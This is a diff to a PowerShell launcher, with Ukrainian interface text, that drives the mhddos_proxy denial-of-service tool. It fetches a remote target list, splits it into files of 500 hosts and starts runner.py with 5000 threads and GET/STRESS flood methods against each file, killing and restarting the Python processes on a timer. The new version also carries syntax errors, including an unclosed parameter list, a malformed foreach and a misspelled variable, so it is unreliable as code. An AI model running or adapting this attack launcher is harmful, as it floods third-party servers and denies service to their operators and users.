@@ -1,8 +1,12 @@
 ﻿[CmdletBinding()]
-param([int]$threads = 5000, [string[]]$methods = @('GET', 'STRESS'))
+param([int]$threads = 5000, [string[]]$methods = @('GET', 'STRESS')
+
+Clear-Host
 
 $ErrorActionPreference = 'Stop'
-Clear-Host
+
+$strMethods = "$methods"
+
 # Will be necessary for Windows 7 adaptation
 If ($PSVersionTable.PSVersion.Major -lt 3) {
     $PsScriptRoot = Split-Path $MyInvocation.MyCommand.Path 
@@ -19,14 +23,14 @@ Write-MiddleHost "УКРАЇНСЬКИЙ ЖНЕЦЬ"
 Write-MiddleHost "Powershell v.$($PSVersionTable.PSVersion)" -ForegroundColor 'Green'
 
 # get targets
-# select lines started with http or tcp only, split them by space
-# resolve ip addresses and remove duplicated (first unique persist)
-# If ip was not resolved asume as unique
 Write-MiddleHost "Завантаження цілей" -NoNewline
 $TargetsSrc = "https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets"
 
 # IP FILTERING:
-# Slow and not confirmed. Produce less targets, some urls in the list have the same ip
+# select lines started with http or tcp only, split them by space
+# resolve ip addresses and remove duplicated (first unique persist)
+# If ip was not resolved asume as unique
+# Slow and not confirmed. Produce less targets, some urls in the list have the same ip, I believe it is better, still not sure
 # $TargetsList = ( ( Download-String -SourceUrl $TargetsSrc ) -split "\n" |
 #     Where-Object { ($_ -like 'http*') -or ($_ -like 'tcp://*') }).Split(" ") |
 #     Foreach-Object { [PsCustomObject]@{ 'address' = "$_"; 'ip' = Get-Ipv4Address -address $_ } } |
@@ -38,13 +42,22 @@ $TargetsList = ( ( Download-String -SourceUrl $TargetsSrc ) -split "\n" |
     Where-Object { ($_ -like 'http*') -or ($_ -like 'tcp://*') }).Split(" ") |
     Sort-Object -Unique
 
-# create files with targets
-$TargetFiles = 'xaa.uaripper.txt', 'xab.uaripper.txt', 'xac.uaripper.txt', 'xad.uaripper.txt'
-$NumberOfTargetsFiles = $TargetFiles.Length
 $NumberOfTargets = $TargetsList.Length
+[System.Collections.ArrayList]$TargetFiles = @()
 
-# little math to calculate number of entries in one file
-$LnInFile = [int]($NumberOfTargets / $NumberOfTargetsFiles)
+# static number of files, dynamic number of targets in file
+# create files with targets
+# $NumberOfTargetsFiles = 4
+# # little math to calculate number of entries in one file
+# $LnInFile = [math]::Ceiling($NumberOfTargets / $NumberOfTargetsFiles)
+
+# dynamic number of files, static number of targets in file
+$LnInFile  = 500
+$NumberOfTargetsFiles = [math]::Ceiling($NumberOfTargets / $LnInFile)
+for ($i = 0; $i -lt $NumberOfTargetsFiles; $i++){
+    $null = $TargetFiles.Add("xa${i}.uaripper.txt")
+}
+
 for ($i = 0; $i -lt $NumberOfTargetsFiles; $i++) {
 	$s = $i * $LnInFile
     $e = ($i -ne $NumberOfTargetsFiles - 1) ? ($s + $LnInFile - 1) : ($NumberOfTargets)
@@ -74,45 +87,31 @@ Write-MiddleHost "Завантаження додаткових компонен
 &"$PyPath\python.exe" -m pip install -r "$LocalMhddosProxy\requirements.txt" --quiet --no-warn-script-location
 
 Write-MiddleHost "Щоб завершити роботу натисніть Ctrl+C"
-$strMethods = "$methods"
-$BackgroundJob = { 
-    $StartParams = @{
-        'FilePath' = "$using:PyPath\python.exe"
-        'ArgumentList' = "$using:LocalMhddosProxy\runner.py -c $using:FilePath -t $using:threads --http-methods $using:strMethods"
-        'WorkingDirectory' = "$using:LocalMhddosProxy"
-        'NoNewWindow' = $true
-        'PassThru' = $true
-        'Wait' = $true
-    }
-    (Start-Process @StartParams).PriorityClass = [System.Diagnostics.ProcessPriorityClass]::Idle
-}
+Write-MiddleHost "Запуск Multidd"
 
 try {
-    $JobCount = 0
-    [System.Collections.ArrayList]$jobList = @()
-    foreach ($targetFile in $TargetFiles) {
-        $JobCount++
+    foreach $targetFile in $TargetFiles) {
+        
         $FilePath = "$RootPath\tmp\$targetFile"
-        Write-MiddleHost "Запуск Multidd$JobCount"
-        $Multidd = Start-ThreadJob -ScriptBlock $BackgroundJob -Name "Multidd$JobCount"
-        # Receive-Job -Job $Multidd -Keep
-        $null = $jobList.Add( $Multidd )
-        $Multidd = $null
+        $StartParams = @{
+            'FilePath' = "$PyPath\python.exe"
+            'ArgumentList' = "$LocalMhddosProxy\runner.py -c $ilePath -t $threads --http-methods $strMethods"
+            'WorkingDirectory' = "$LocalMhddosProxy"
+            'NoNewWindow' = $true
+            'PassThru' = $true
+            'Wait' = $false
+        }
+        ($PyProcess = Start-Process @StartParams).PriorityClass = [System.Diagnostics.ProcessPriorityClass]::Idle
+        Start-Sleep -Seconds 60
+        Get-Process | Where-Object { $_.Path -eq "$PyPath\python.exe"} | Stop-Process -Force
     }
-    
-    Start-Sleep -Seconds 30 # wait for 20 minutes
 }
 catch { $_ }
 finally {
-    Write-MiddleHost "Завершення роботи mhddos_proxy" -Here -NoNewline
-    foreach ($Multidd in $jobList) {
-        $Name = $Multidd.Name
-        Receive-Job -Job $Multidd | Stop-Process -Force -ErrorAction Ignore
-        if ($?) { Write-MiddleHost "Python для $Name завершено" }
-        else { Write-MiddleHost "Не вдалося завершити роботу Python.exe для $Name" -ForegroundColor Red }
-        Stop-job -Job $Multidd -PassThru | Remove-Job -Force
-    }
+    Write-MiddleHost "Завершення роботи mhddos_proxy"
+    Get-Process | Where-Object { $_.Path -eq "$PyPath\python.exe"} | Stop-Process -Force
 }
+
 $StartParams = @{
     'FilePath' = "$RootPath\Powershell\pwsh.exe"
     'ArgumentList' = "-ExecutionPolicy Bypass -File `"$RootPath\PsScripts\Start.ps1`""
